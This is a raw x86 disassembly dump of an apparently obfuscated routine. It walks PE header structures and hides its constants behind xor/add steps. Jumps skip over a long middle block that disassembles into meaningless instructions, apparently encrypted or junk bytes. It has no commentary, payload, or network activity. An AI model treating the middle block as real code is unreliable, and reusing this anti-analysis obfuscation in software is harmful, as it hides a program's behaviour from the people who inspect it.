  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x53]
  40c49b:	sahf   
  40c49c:	and    ch,BYTE PTR [eax+0x19]
  40c49f:	xchg   DWORD PTR [esi+0x7e],edi
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c4a0
  40c4a7:	xchg   ecx,eax
  40c4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4a9:	ins    BYTE PTR es:[edi],dx
  40c4aa:	cmp    BYTE PTR [bp+di+0x62f],cl
  40c4af:	imul   esp,esp,0xfffffff4
  40c4b2:	xchg   ebp,eax
  40c4b3:	or     eax,0x7061c106
  40c4b8:	push   es
  40c4b9:	in     al,dx
  40c4ba:	(bad)
  40c4bd:	fldenv [ebp-0x1a33f631]
  40c4c3:	std    
  40c4c4:	pop    ss
  40c4c5:	js     0x40c4b8
  40c4c7:	test   al,0x48
  40c4c9:	sub    al,0x3a
  40c4cb:	pop    ss
  40c4cc:	lahf   
  40c4cd:	out    0x42,al
  40c4cf:	pop    ecx
  40c4d0:	int    0x65
  40c4d2:	out    0x48,al
  40c4d4:	jb     0x40c53d
  40c4d6:	dec    DWORD PTR [edx]
  40c4d8:	mov    BYTE PTR [eax-0x49],dl
  40c4db:	fstp   DWORD PTR [esp+edx*2+0x4f]
  40c4df:	xor    eax,0x5241d353
  40c4e4:	lods   eax,DWORD PTR ds:[esi]
  40c4e5:	icebp  
  40c4e6:	loopne 0x40c558
  40c4e8:	push   ss
  40c4e9:	jae    0x40c4ab
  40c4eb:	test   BYTE PTR [eax+eiz*1],bl
  40c4ee:	arpl   WORD PTR [edi],dx
  40c4f0:	mov    dl,0xcf
  40c4f2:	jns    0x40c49f
  40c4f4:	push   esp
  40c4f5:	cmp    DWORD PTR [eax],ebp
  40c4f7:	xchg   ebx,eax
  40c4f8:	inc    esi
  40c4f9:	mov    BYTE PTR [eax],ch
  40c4fb:	cmp    dl,bh
  40c4fd:	mov    al,ds:0x30669a75
  40c502:	sub    ebx,eax
  40c504:	mov    ah,BYTE PTR [ebx-0x78]
  40c507:	mov    ch,BYTE PTR [eax]
  40c509:	push   edi
  40c50a:	xchg   ebp,eax
  40c50b:	jne    0x40c56b
  40c50d:	inc    eax
  40c50e:	popa   
  40c50f:	fs (bad) 
  40c511:	xchg   ebx,eax
  40c512:	cdq    
  40c513:	xlat   BYTE PTR ds:[ebx]
  40c514:	mov    eax,ds:0xcd833f7b
  40c519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c51a:	lock jmp 0xf895:0xfc868c98
  40c522:	add    eax,0x74949a35
  40c527:	jae    0x40c561
  40c529:	push   0xffffff95
  40c52b:	pop    esi
  40c52c:	(bad)  
  40c52d:	xlat   BYTE PTR ds:[ebx]
  40c52e:	loopne 0x40c4e2
  40c530:	cmp    BYTE PTR [esi-0x4bf75fd2],al
  40c536:	nop
  40c537:	outs   dx,BYTE PTR ds:[esi]
  40c538:	or     DWORD PTR [eax-0x6fc1f90f],0x5eef1fec
  40c542:	dec    eax
  40c543:	call   0xb904c519
  40c548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c549:	jmp    0xaa536b6c
  40c54e:	sbb    ah,dh
  40c550:	jge    0x40c513
  40c552:	or     dl,BYTE PTR [eax-0x3f]
  40c555:	jne    0x40c59b
  40c557:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c558:	add    DWORD PTR [ebp*8-0x1156b4b5],0xffffffbc
  40c560:	fmulp  st(5),st
  40c562:	(bad)  
  40c564:	shr    DWORD PTR [ecx+0x8de71c0],0xbb
  40c56b:	dec    ebp
  40c56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c56d:	add    eax,0x38dc7431
  40c572:	mov    bh,0x9f
  40c574:	out    dx,eax
  40c575:	or     dh,BYTE PTR [esi+0x68618992]
  40c57b:	push   ds
  40c57c:	arpl   WORD PTR [edi-0x23d3ebdf],si
  40c582:	xchg   ebx,eax
  40c583:	add    dl,cl
  40c585:	cmp    DWORD PTR [eax-0x4c667990],eax
  40c58b:	dec    edi
  40c58c:	add    BYTE PTR [esi+0x4a],ch
  40c58f:	or     al,0xea
  40c591:	inc    ebp
  40c592:	add    al,0x54
  40c594:	in     eax,0xc9
  40c596:	in     al,dx
  40c597:	add    eax,DWORD PTR [edi]
  40c599:	in     eax,dx
  40c59a:	repz hlt 
  40c59c:	test   esp,ebp
  40c59e:	jg     0x40c55d
  40c5a0:	loopne 0x40c598
  40c5a2:	push   ebp
  40c5a3:	cmp    dh,al
  40c5a5:	push   ebx
  40c5a6:	sub    eax,0xd313438d
  40c5ab:	xor    al,0x95
  40c5ad:	mov    fs,ebx
  40c5af:	cli    
  40c5b0:	jmp    0x5a2d:0x3f8ab3a6
  40c5b7:	outs   dx,DWORD PTR ds:[esi]
  40c5b8:	inc    ebx
  40c5b9:	popf   
  40c5ba:	or     esi,DWORD PTR [ebp-0x5]
  40c5bd:	cmp    bh,cl
  40c5bf:	icebp  
  40c5c0:	jp     0x40c621
  40c5c2:	popa   
  40c5c3:	test   BYTE PTR [ecx+0xaa31ef5],ah
  40c5c9:	jo     0x40c5fc
  40c5cb:	or     BYTE PTR [eax],0x72
  40c5ce:	cmp    DWORD PTR [eax-0x75],ebp
  40c5d1:	cdq    
  40c5d2:	jmp    0x40c55d
  40c5d4:	adc    eax,0x8aa3f789
  40c5d9:	scas   eax,DWORD PTR es:[edi]
  40c5da:	dec    eax
  40c5db:	jmp    0x35a4:0xe19785cc
  40c5e2:	cmp    al,0x11
  40c5e4:	int3   
  40c5e5:	push   ebp
  40c5e6:	sbb    BYTE PTR fs:[ecx],dh
  40c5e9:	push   eax
  40c5ea:	ins    DWORD PTR es:[edi],dx
  40c5eb:	xchg   BYTE PTR [edi],cl
  40c5ed:	xchg   edi,eax
  40c5ee:	test   BYTE PTR [esp+eax*4],cl
  40c5f1:	push   esi
  40c5f2:	sub    DWORD PTR [edx-0x3f25c588],0xffffffea
  40c5f9:	xchg   esp,eax
  40c5fa:	inc    ebx
  40c5fb:	adc    BYTE PTR [eiz*8+0x720855f],cl
  40c602:	loop   0x40c5b3
  40c604:	hlt    
  40c605:	and    eax,0x5ce7ab1
  40c60a:	xchg   esp,ebx
  40c60c:	fcom   DWORD PTR [edi-0x139ae5bd]
  40c612:	dec    esi
  40c613:	loop   0x40c62c
  40c615:	mov    ds:0xb81d40bf,al
  40c61a:	lods   eax,DWORD PTR ds:[esi]
  40c61b:	inc    edi
  40c61c:	fmul   DWORD PTR [edi-0x6]
  40c61f:	add    eax,0x14cae06c
  40c624:	jnp    0x40c657
  40c626:	popf   
  40c627:	mov    ds:0x459dc828,eax
  40c62c:	retf   
  40c62d:	jecxz  0x40c67f
  40c62f:	mov    ebp,0xaad60ad8
  40c634:	rol    ah,cl
  40c636:	add    DWORD PTR [ebp-0x7332493c],ebx
  40c63c:	cmp    edx,DWORD PTR [ecx]
  40c63e:	xchg   DWORD PTR [edi-0x2fff9e0f],ecx
  40c644:	jecxz  0x40c623
  40c646:	mov    ebp,DWORD PTR [ebp+0x6980b6f6]
  40c64c:	mov    eax,0xb02e0c66
  40c651:	bound  ecx,QWORD PTR [edx+0x2f]
  40c654:	test   DWORD PTR [ebp+0x659fa415],esp
  40c65a:	add    eax,DWORD PTR [esp+eiz*8-0x10]
  40c65e:	push   esi
  40c65f:	sub    bl,dh
  40c661:	in     eax,0x96
  40c663:	push   ebp
  40c664:	xor    edx,DWORD PTR [esi-0x52e3aea3]
  40c66a:	into   
  40c66b:	aas    
  40c66c:	xchg   ecx,ecx
  40c66e:	je     0x40c694
  40c670:	nop
  40c671:	out    dx,al
  40c672:	mov    ds:0xf3364118,eax
  40c677:	fidiv  WORD PTR [eax+0x19]
  40c67a:	xchg   esp,eax
  40c67b:	(bad)  
  40c67c:	ffreep st(0)
  40c67e:	into   
  40c67f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c680:	mov    ebx,0x44bd21e0
  40c685:	mov    cl,0xb9
  40c687:	inc    BYTE PTR [esi+0x56]
  40c68a:	xor    al,0x34
  40c68c:	int    0x1b
  40c68e:	fwait
  40c68f:	test   DWORD PTR [ebx-0x6111ef43],0xd071985
  40c699:	cmp    ah,BYTE PTR [ebp-0x721880a1]
  40c69f:	fidivr DWORD PTR [ecx]
  40c6a1:	inc    edi
  40c6a2:	jbe    0x40c6e6
  40c6a4:	mov    eax,ds:0x55394dae
  40c6a9:	mov    ah,0x9f
  40c6ab:	jne    0x40c6ed
  40c6ad:	aam    0xec
  40c6af:	popa   
  40c6b0:	dec    edi
  40c6b1:	mov    WORD PTR [esi+0x68e947b6],fs
  40c6b7:	mov    ds:0xcec685e1,al
  40c6bc:	repz retf 
  40c6be:	jg     0x40c675
  40c6c0:	ins    BYTE PTR es:[edi],dx
  40c6c1:	mov    dl,0xc3
  40c6c3:	mov    al,ds:0x20889fa4
  40c6c8:	jmp    0x40c68f
  40c6ca:	in     al,0xc3
  40c6cc:	xchg   BYTE PTR [eax-0x5dc296b4],dh
  40c6d2:	adc    eax,0xf55042bd
  40c6d7:	aam    0x49
  40c6d9:	jg     0x40c66e
  40c6db:	dec    ebp
  40c6dc:	push   esi
  40c6dd:	cli    
  40c6de:	cmp    eax,0xfc4607a9
  40c6e3:	cmp    al,0x6f
  40c6e5:	outs   dx,BYTE PTR ds:[esi]
  40c6e6:	sbb    eax,0xa611c8ec
  40c6eb:	adc    dh,BYTE PTR [edx]
  40c6ed:	mov    ebp,0x82b66ff6
  40c6f2:	ret    
  40c6f3:	sub    esp,DWORD PTR [edi-0x7ef97f9c]
  40c6f9:	gs mov bl,0xbb
  40c6fc:	mov    esi,eax
  40c6fe:	jnp    0x40c73c
  40c700:	clc    
  40c701:	retf   
  40c702:	fisttp WORD PTR [ebx-0x4fd748b8]
  40c708:	repnz push ecx
  40c70a:	enter  0x8b86,0x5
  40c70e:	adc    esp,DWORD PTR [esi-0x596382c2]
  40c714:	inc    ebx
  40c715:	dec    edi
  40c716:	sbb    BYTE PTR [edi],0x59
  40c719:	xor    DWORD PTR [ecx],0xa51be07e
  40c71f:	and    BYTE PTR [ecx+0x5169c7b2],ah
  40c725:	fst    DWORD PTR [eax]
  40c727:	mov    edi,edx
  40c729:	xchg   edx,eax
  40c72a:	pop    ss
  40c72b:	imul   DWORD PTR [edi+0x53]
  40c72e:	fcomi  st,st(1)
  40c730:	mov    WORD PTR [ebp+0x752defac],?
  40c736:	stc    
  40c737:	inc    eax
  40c738:	ins    DWORD PTR es:[edi],dx
  40c739:	pop    ebx
  40c73a:	sub    eax,0xa8343e97
  40c73f:	lods   eax,DWORD PTR ds:[esi]
  40c740:	xchg   esi,eax
  40c741:	fisttp DWORD PTR [ebx+edi*4]
  40c744:	inc    edx
  40c745:	pushf  
  40c746:	(bad)  
  40c747:	(bad)  
  40c748:	fcom   DWORD PTR [ebx]
  40c74a:	aaa    
  40c74b:	sub    ebx,0xffffff92
  40c74e:	or     al,0x26
  40c750:	mov    ds:0x1d7afb54,eax
  40c755:	inc    eax
  40c756:	adc    BYTE PTR [eax-0x30],ah
  40c759:	test   BYTE PTR [ebx-0x69867a9b],0x9d
  40c760:	pop    ebx
  40c761:	sar    DWORD PTR [esi-0x6e4324c1],0x48
  40c768:	(bad)  
  40c769:	sub    DWORD PTR [ebx-0xe814fae],esi
  40c76f:	cdq    
  40c770:	or     DWORD PTR es:[ecx-0x2],edx
  40c774:	xchg   BYTE PTR [ecx],al
  40c776:	ins    DWORD PTR es:[edi],dx
  40c777:	iret   
  40c778:	fdivr  st,st(7)
  40c77a:	stc    
  40c77b:	rcr    ah,1
  40c77d:	add    ecx,ebx
  40c77f:	push   0x5a2acaab
  40c784:	icebp  
  40c785:	jle    0x40c78e
  40c787:	iret   
  40c788:	loop   0x40c78d
  40c78a:	cmp    eax,0x24a96864
  40c78f:	push   eax
  40c790:	inc    ecx
  40c791:	pop    ecx
  40c792:	leave  
  40c793:	imul   ebx,DWORD PTR [ebx-0x24],0x72
  40c797:	mov    ah,0xdc
  40c799:	(bad)
  40c79c:	bound  ebx,QWORD PTR [ebp+0x5c003063]
  40c7a2:	lahf   
  40c7a3:	xchg   DWORD PTR [edx+ecx*1+0x39],esp
  40c7a7:	pop    eax
  40c7a8:	dec    edi
  40c7a9:	(bad)  
  40c7aa:	pop    ebp
  40c7ab:	lods   eax,DWORD PTR ds:[esi]
  40c7ac:	and    ebx,DWORD PTR [esi+0x51]
  40c7af:	push   esi
  40c7b0:	lahf   
  40c7b1:	outs   dx,DWORD PTR ds:[esi]
  40c7b2:	mov    dl,0xd3
  40c7b4:	xor    DWORD PTR [edx-0x72],eax
  40c7b7:	fs aam 0xf2
  40c7ba:	or     eax,eax
  40c7bc:	(bad)  
  40c7bd:	loop   0x40c74b
  40c7bf:	dec    edi
  40c7c0:	push   edx
  40c7c1:	(bad)  
  40c7c2:	mov    esp,0xb75bfa9
  40c7c7:	(bad)  
  40c7c8:	dec    edx
  40c7c9:	retf   0xe3cf
  40c7cc:	bound  ecx,QWORD PTR [esi+0x30]
  40c7cf:	adc    bh,BYTE PTR [ebx]
  40c7d1:	lahf   
  40c7d2:	sbb    eax,0x8b564f5b
  40c7d7:	dec    ebp
  40c7d8:	clc    
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	sbb    dl,cl
  40c801:	lods   eax,DWORD PTR ds:[esi]
  40c802:	mov    dh,0xc9
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c886
  40c80c:	dec    edi
  40c80d:	push   esp
  40c80e:	retf   
  40c80f:	mov    ebx,0x4605f62
  40c814:	xlat   BYTE PTR ds:[ebx]
  40c815:	jns    0x40c88e
  40c817:	jns    0x40c833
  40c819:	imul   esp,DWORD PTR [edi+eax*4+0x5f],0xfa16f66b
  40c821:	push   esp
  40c822:	scas   eax,DWORD PTR es:[edi]
  40c823:	fs es mov bl,0xda
  40c827:	nop
  40c828:	fmul   QWORD PTR [edx]
  40c82a:	push   0x12
  40c82c:	cdq    
  40c82d:	jae    0x40c85f
  40c82f:	mov    ch,0xc2
  40c831:	mov    esp,DWORD PTR [eax+0x3b08a23a]
  40c837:	repnz mov edx,0xbb0503cf
  40c83d:	or     ecx,ebx
  40c83f:	sahf   
  40c840:	sbb    DWORD PTR [ebp+0x2aacc4b6],ecx
  40c846:	out    0xd8,eax
  40c848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c849:	mov    ch,BYTE PTR [ebx+0x27a69c29]
  40c84f:	add    eax,0xb0e47d93
  40c854:	pusha  
  40c855:	daa    
  40c856:	addr16 mov ah,dl
  40c859:	pop    esp
  40c85a:	mov    BYTE PTR [ebx],dh
  40c85c:	mov    eax,0x2e8557ff
  40c861:	test   al,0x25
  40c863:	and    esp,DWORD PTR [eax-0x6b]
  40c866:	mov    al,0x34
  40c868:	or     al,0x87
  40c86a:	mov    eax,DWORD PTR [edi+0x27]
  40c86d:	fnstenv [edx-0x1ed03a6d]
  40c873:	and    al,0xcc
  40c875:	xchg   esi,eax
  40c876:	lods   eax,DWORD PTR ds:[esi]
  40c877:	cdq    
  40c878:	add    al,0x36
  40c87a:	pop    ss
  40c87b:	ficom  WORD PTR [ecx-0x5d]
  40c87e:	sti    
  40c87f:	fisub  DWORD PTR [ebx-0x46143aeb]
  40c885:	and    ebx,esp
  40c887:	test   eax,0xba54cb92
  40c88c:	hlt    
  40c88d:	in     al,dx
  40c88e:	arpl   cx,sp
  40c890:	pop    es
  40c891:	sar    DWORD PTR [esi-0x15],1
  40c894:	iret   
  40c895:	xchg   esp,eax
  40c896:	xchg   esi,eax
  40c897:	out    0x2,eax
  40c899:	test   al,0x93
  40c89b:	bound  ebx,QWORD PTR [edx+0x7a149b90]
  40c8a1:	mov    ch,0xc1
  40c8a3:	adc    BYTE PTR [eax+eiz*1-0x7c8f25c0],cl
  40c8aa:	push   es
  40c8ab:	mov    ebx,0x5199f177
  40c8b0:	pop    eax
  40c8b1:	push   ds
  40c8b2:	cs scas eax,DWORD PTR es:[edi]
  40c8b4:	retf   
  40c8b5:	fsubr  DWORD PTR [edi-0x5112f7a8]
  40c8bb:	out    0xe9,eax
  40c8bd:	inc    edx
  40c8be:	add    al,0x1
  40c8c0:	push   ds
  40c8c1:	and    al,0x6e
  40c8c3:	adc    ecx,DWORD PTR [edx+ecx*1+0x73920880]
  40c8ca:	icebp  
  40c8cb:	hlt    
  40c8cc:	inc    esp
  40c8cd:	arpl   bp,dx
  40c8cf:	rcr    DWORD PTR [edi+0x45917be1],0x7e
  40c8d6:	pop    ebp
  40c8d7:	sbb    al,0xf6
  40c8d9:	popf   
  40c8da:	pop    edx
  40c8db:	aas    
  40c8dc:	cdq    
  40c8dd:	add    al,0x3a
  40c8df:	push   esp
  40c8e0:	sbb    ecx,esi
  40c8e2:	fisttp WORD PTR [eax-0x22f7014]
  40c8e8:	dec    ecx
  40c8e9:	xor    BYTE PTR [esi],al
  40c8eb:	fwait
  40c8ec:	sbb    edx,DWORD PTR [ebx]
  40c8ee:	cmp    BYTE PTR [ecx],ah
  40c8f0:	jb     0x40c938
  40c8f2:	xor    DWORD PTR [edi],ecx
  40c8f4:	push   ecx
  40c8f5:	push   ebx
  40c8f6:	cmp    al,0x4a
  40c8f8:	cmp    ebp,DWORD PTR [eax-0x25]
  40c8fb:	lods   eax,DWORD PTR ds:[esi]
  40c8fc:	dec    ecx
  40c8fd:	scas   eax,DWORD PTR es:[edi]
  40c8fe:	or     eax,DWORD PTR [ecx+0x6b]
  40c901:	aam    0xb8
  40c903:	xlat   BYTE PTR ds:[ebx]
  40c904:	or     esp,eax
  40c906:	pop    fs
  40c908:	cs retf 0x7bf3
  40c90c:	lds    eax,FWORD PTR [edi]
  40c90e:	aam    0x69
  40c910:	xchg   edx,eax
  40c911:	pop    ecx
  40c912:	dec    eax
  40c913:	daa    
  40c914:	ins    DWORD PTR es:[edi],dx
  40c915:	pop    eax
  40c916:	sti    
  40c917:	add    al,0x90
  40c919:	loop   0x40c970
  40c91b:	dec    eax
  40c91c:	add    eax,ebp
  40c91e:	pop    ecx
  40c91f:	push   esi
  40c920:	sti    
  40c921:	adc    cl,BYTE PTR [ecx]
  40c923:	or     esp,DWORD PTR [ebp-0x79]
  40c926:	sbb    al,bh
  40c928:	and    DWORD PTR [ebp+0x10e20332],esi
  40c92e:	jle    0x40c908
  40c930:	or     BYTE PTR [ecx],ch
  40c932:	sahf   
  40c933:	pop    ds
  40c934:	shl    bl,cl
  40c936:	sbb    BYTE PTR [edi-0x28],0xf9
  40c93a:	mov    ecx,0x88fa7fa
  40c93f:	and    esi,ebx
  40c941:	(bad)  [ecx+eax*8-0x7c3c369d]
  40c948:	xor    ah,ch
  40c94a:	mov    cl,0x3e
  40c94c:	xor    DWORD PTR [edx+0x1a],edi
  40c94f:	fld    DWORD PTR [eax+0x53918a73]
  40c955:	or     bh,al
  40c957:	or     eax,esp
  40c959:	les    ebp,FWORD PTR [edi+0x6e11a7a1]
  40c95f:	mov    ch,0x4b
  40c961:	frstor [ebp+eiz*2+0x6eb43c00]
  40c968:	shl    DWORD PTR ds:0x30a13bb2,0xf1
  40c96f:	xchg   edi,eax
  40c970:	or     BYTE PTR ds:[edx+0xf3b013a],dh
  40c977:	icebp  
  40c978:	test   al,0x8d
  40c97a:	pop    edi
  40c97b:	lahf   
  40c97c:	ins    DWORD PTR es:[edi],dx
  40c97d:	xchg   ecx,eax
  40c97e:	repnz mov al,ds:0xe60be9e0
  40c984:	ja     0x40c9b8
  40c986:	jo     0x40c941
  40c988:	push   ss
  40c989:	fwait
  40c98a:	call   0x52ce7f3f
  40c98f:	ss xchg esi,eax
  40c991:	pop    esp
  40c992:	inc    ebp
  40c993:	sub    BYTE PTR [edx-0x2c26f6e4],dl
  40c999:	fistp  WORD PTR [esi]
  40c99b:	inc    esi
  40c99c:	loope  0x40c99b
  40c99e:	xchg   edi,eax
  40c99f:	test   DWORD PTR [ebp+0x37],ebx
  40c9a2:	add    esi,DWORD PTR [eax-0x404a5084]
  40c9a8:	mov    al,BYTE PTR [ecx]
  40c9aa:	pop    ecx
  40c9ab:	push   ebp
  40c9ac:	mov    BYTE PTR [ebp+0x2e],bh
  40c9af:	sbb    edi,ebx
  40c9b1:	iret   
  40c9b2:	mov    ebp,0x2cbdf135
  40c9b7:	mov    ds:0x9544e1ab,al
  40c9bc:	mov    ds:0xdcd37205,eax
  40c9c1:	jne    0x40c9c0
  40c9c3:	push   esi
  40c9c4:	sub    DWORD PTR [edi+0x71962ecc],ebx
  40c9ca:	add    DWORD PTR [ebp+0x2e],0x7a
  40c9ce:	ficomp WORD PTR [edx]
  40c9d0:	in     al,dx
  40c9d1:	add    eax,0x1cbfebb0
  40c9d6:	mov    ecx,0xb1e11fc1
  40c9db:	loope  0x40c9eb
  40c9dd:	stos   BYTE PTR es:[di],al
  40c9df:	dec    edi
  40c9e0:	push   0xffffffef
  40c9e2:	repz adc al,0x16
  40c9e5:	icebp  
  40c9e6:	inc    edx
  40c9e7:	jbe    0x40c9ea
  40c9e9:	sbb    DWORD PTR [ebx],edx
  40c9eb:	sub    DWORD PTR ds:0xc23cbff5,edi
  40c9f1:	sar    BYTE PTR [ebp+eiz*8+0x68],cl
  40c9f5:	mov    bl,0xec
  40c9f7:	cdq    
  40c9f8:	jae    0x40c9dd
  40c9fa:	sub    al,0x26
  40c9fc:	or     al,0xe6
  40c9fe:	and    dh,dl
  40ca00:	adc    esp,DWORD PTR [ebx+ecx*4]
  40ca03:	stos   DWORD PTR es:[edi],eax
  40ca04:	outs   dx,DWORD PTR ds:[esi]
  40ca05:	repnz sub al,0x2
  40ca08:	or     bl,BYTE PTR [eax+esi*8]
  40ca0b:	daa    
  40ca0c:	jmp    0x2976:0x6a92d0a2
  40ca13:	test   BYTE PTR [esi],al
  40ca15:	lahf   
  40ca16:	daa    
  40ca17:	jmp    0x520dedc7
  40ca1c:	sub    DWORD PTR [ecx-0x6b],ecx
  40ca1f:	addr16 mov esp,0xa121311a
  40ca25:	jnp    0x40ca0d
  40ca27:	lea    eax,[si+0x75ff]
  40ca2c:	into   
  40ca2d:	mov    es,WORD PTR [edi+0x17]
  40ca30:	or     eax,0x53cdf085
  40ca35:	mov    bh,ah
  40ca37:	les    edx,FWORD PTR [ebx+0x286534af]
  40ca3d:	sbb    al,0xdd
  40ca3f:	cmp    edi,ebx
  40ca41:	shr    BYTE PTR [eax-0x3129aa51],1
  40ca47:	lods   eax,DWORD PTR ds:[esi]
  40ca49:	jge    0x40ca04
  40ca4b:	in     al,0xd4
  40ca4d:	outs   dx,DWORD PTR ds:[esi]
  40ca4e:	lahf   
  40ca4f:	xor    al,0xff
  40ca51:	xor    dl,dh
  40ca53:	repnz mov es,WORD PTR fs:[edi-0x6b]
  40ca58:	and    ch,BYTE PTR [edi+ecx*4-0x7aa33043]
  40ca5f:	imul   ebp,DWORD PTR [ebx+0x22],0xffffff81
  40ca63:	retf   
  40ca64:	in     eax,dx
  40ca65:	imul   ebx,DWORD PTR [edx],0x61
  40ca68:	adc    BYTE PTR [ebx+0x36a88b14],bh
  40ca6e:	sbb    edx,DWORD PTR [esi-0x49]
  40ca71:	mov    dl,0x7a
  40ca73:	dec    eax
  40ca74:	hlt    
  40ca75:	xchg   esp,eax
  40ca76:	mov    ch,0x28
  40ca78:	and    edi,ebp
  40ca7a:	jno    0x40ca75
  40ca7c:	push   eax
  40ca7d:	jecxz  0x40caed
  40ca7f:	retf   0x7c37
  40ca82:	pop    esp
  40ca83:	jl     0x40ca08
  40ca85:	ss out 0x7f,eax
  40ca88:	pop    es
  40ca89:	out    0xb3,eax
  40ca8b:	stos   BYTE PTR es:[edi],al
  40ca8c:	sbb    eax,0x8125daff
  40ca91:	shl    ah,cl
  40ca93:	rcr    dl,cl
  40ca95:	xor    DWORD PTR [esi],esi
  40ca97:	push   esp
  40ca98:	dec    ebp
  40ca99:	pop    ecx
  40ca9a:	ins    BYTE PTR es:[edi],dx
  40ca9b:	inc    esp
  40ca9c:	inc    ebx
  40ca9d:	dec    esp
  40ca9e:	mov    esp,0x107f52db
  40caa3:	pop    ebx
  40caa4:	mov    cl,0x52
  40caa6:	push   cs
  40caa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caa8:	jno    0x40caf7
  40caaa:	dec    ebx
  40caab:	std    
  40caac:	pop    ds
  40caad:	cmp    BYTE PTR [ebx+edx*1+0x9],bh
  40cab1:	adc    DWORD PTR [eax],ebx
  40cab3:	and    al,0xc1
  40cab5:	cmp    cl,BYTE PTR ds:0xd508d2fc
  40cabb:	sub    esp,DWORD PTR [eax]
  40cabd:	and    ebp,DWORD PTR [edx+0x4e]
  40cac0:	aaa    
  40cac1:	test   al,0x6a
  40cac3:	inc    edx
  40cac4:	(bad)  
  40cac5:	sti    
  40cac6:	icebp  
  40cac7:	xchg   DWORD PTR ds:0xbb6f8649,ebx
  40cacd:	dec    esi
  40cace:	push   eax
  40cacf:	mov    dh,0x45
  40cad1:	imul   ebp,esp,0xbcbd7e4a
  40cad7:	push   eax
  40cad8:	pop    esi
  40cad9:	in     al,0x66
  40cadb:	inc    esi
  40cadc:	fst    st(2)
  40cade:	outs   dx,BYTE PTR ds:[esi]
  40cadf:	jp     0x40cac3
  40cae1:	or     bl,bh
  40cae3:	aas    
  40cae4:	mov    ecx,0xa454e3c6
  40cae9:	daa    
  40caea:	push   ebx
  40caeb:	pop    ds
  40caec:	and    esp,ebp
  40caee:	add    bl,cl
  40caf0:	fdivr  st,st(2)
  40caf2:	cmp    esi,ebp
  40caf4:	fsub   st,st(1)
  40caf6:	repnz push esi
  40caf8:	or     al,0x68
  40cafa:	push   esp
  40cafb:	jp     0x40caed
  40cafd:	cs fwait
  40caff:	pop    ecx
  40cb00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb01:	add    BYTE PTR [esi],bl
  40cb03:	les    edx,FWORD PTR [eax+0x5b]
  40cb06:	or     dh,BYTE PTR [edi]
  40cb08:	hlt    
  40cb09:	(bad)  
  40cb0a:	mov    DWORD PTR [ecx-0x43a929ff],esi
  40cb10:	(bad)  
  40cb12:	out    dx,eax
  40cb13:	xchg   ebx,eax
  40cb14:	jno    0x40cb90
  40cb16:	dec    ecx
  40cb17:	jle    0x40cb2e
  40cb19:	loope  0x40cae3
  40cb1b:	out    dx,al
  40cb1c:	cs cmp eax,0x316f2f89
  40cb22:	in     al,0x49
  40cb24:	rcl    BYTE PTR [eax+0x58e79975],1
  40cb2a:	sbb    eax,0x6f2d5280
  40cb2f:	cmp    bh,dl
  40cb31:	stc    
  40cb32:	cld    
  40cb33:	and    bh,BYTE PTR [ebx-0x5c]
  40cb36:	or     eax,0x3d6a955a
  40cb3b:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
